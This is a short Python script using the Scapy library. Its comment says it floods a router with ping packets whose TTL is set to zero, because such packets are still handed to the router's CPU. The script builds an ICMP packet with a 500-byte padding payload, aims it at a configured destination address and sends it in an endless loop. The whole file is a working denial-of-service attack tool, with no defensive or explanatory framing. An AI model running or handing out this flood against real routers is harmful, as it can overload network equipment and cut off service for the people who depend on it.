#!venv/bin/python

from scapy.all import *
from scapy.all import IP, ICMP
import settings
"""
Sending a lot of tll0 pings to flooding router. ttl0 packet are still copied to CPU !
"""

# Create an IP Packet with ttl set to 0 and destination = target
pck = IP(dst=settings.destination_ip, ttl=0)/ICMP()/Raw(b"X" * 500) # append ICMP to finish the packet
pck.show()
send(pck, iface=settings.source_interface, loop=1)